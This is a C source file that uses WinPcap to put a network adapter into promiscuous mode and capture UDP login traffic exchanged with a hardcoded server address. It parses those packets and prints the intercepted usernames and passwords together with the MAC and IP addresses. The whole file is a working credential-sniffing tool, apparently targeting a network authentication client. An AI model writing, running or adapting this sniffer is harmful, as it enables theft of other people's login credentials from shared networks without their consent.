
#include <malloc.h>
#include <memory.h>
#include <stdio.h>

#include <pcap.h>

#include "network_packet.h"
#include "login_packet.h"

#pragma comment (lib,"wpcap.lib")

#define SERVER_IP "172.16.1.180"

void packet_handler(u_char* packets,const struct pcap_pkthdr *header,const u_char *data) {
    struct ether_header* ether=(struct ether_header*)data;
    switch (ntohs(ether->ether_type)) {
        case 0x0800: {  //  IP 数据包
            struct iphead* ip=(struct iphead*)(data+sizeof(struct ether_header));
            switch (ip->ip_protocol) {  //  UDP 协议数据包
                case 17: {
                    struct udphead* udp=(struct udphead*)(data+sizeof(struct ether_header)+sizeof(struct iphead));

                    if (0!=strcmp(SERVER_IP,inet_ntoa(ip->ip_destination_address)) && 0!=strcmp(SERVER_IP,inet_ntoa(ip->ip_souce_address))) return;

                    if (FLAG_START==*(char*)(data+sizeof(struct ether_header)+sizeof(struct iphead)+sizeof(struct udphead))) {
                        char* udp_data=(char*)malloc(udp->udp_length);
                        memcpy(udp_data,(const char*)(data+sizeof(struct ether_header)+sizeof(struct iphead)+sizeof(struct udphead)),udp->udp_length);
                            
                        userdata data;
                        login_packet(udp_data,header->len,&data);

                        printf("Dest-MAC:%02X:%02X:%02X:%02X:%02X:%02X\n",ether->ether_dhost[0],ether->ether_dhost[1],ether->ether_dhost[2],ether->ether_dhost[3],ether->ether_dhost[4],ether->ether_dhost[5]);
                        printf("Sorc-MAC:%02X:%02X:%02X:%02X:%02X:%02X\n",ether->ether_shost[0],ether->ether_shost[1],ether->ether_shost[2],ether->ether_shost[3],ether->ether_shost[4],ether->ether_shost[5]);

                        printf("Dest_IP:%s (Port:%d)\n",inet_ntoa(ip->ip_destination_address),ntohs(udp->udp_destinanion_port));
                        printf("Sorc_IP:%s (Port:%d)\n",inet_ntoa(ip->ip_souce_address),ntohs(udp->udp_source_port));

                        printf("username:%s\n",data.username);
                        printf("password:%s\n\n",data.password);

                        free(udp_data);
                    }
                }
            }
        }
    }
}

void winpcap_init(void) {
    pcap_if_t *alldevs;
	pcap_if_t *d;
	int inum=1;
	int i=0;
	pcap_t *adhandle;
	char errbuf[PCAP_ERRBUF_SIZE];
	if (pcap_findalldevs(&alldevs, errbuf) == -1) {
		fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
		return;
	}
	for(d=alldevs;d;d=d->next) {
		printf("%d. %s", ++i, d->name);
		if (d->description)
			printf(" (%s)\n", d->description);
		else
			printf(" (No description available)\n");
	}
	if(i==0) {
		printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
		return;  
	}
	for(d=alldevs, i=0; i< inum-1;d=d->next, i++);
	if ((adhandle= pcap_open_live(d->name,65536,1,1,errbuf) ) == NULL)
	{
		printf("Unable to open the adapter");
		pcap_freealldevs(alldevs);
		return;  
	}
	printf("\nlistening on %s...\n", d->description);
	pcap_freealldevs(alldevs);

	pcap_loop(adhandle,0, packet_handler, NULL);
}

void main(void) {
    winpcap_init();
    getchar();
	return;
}
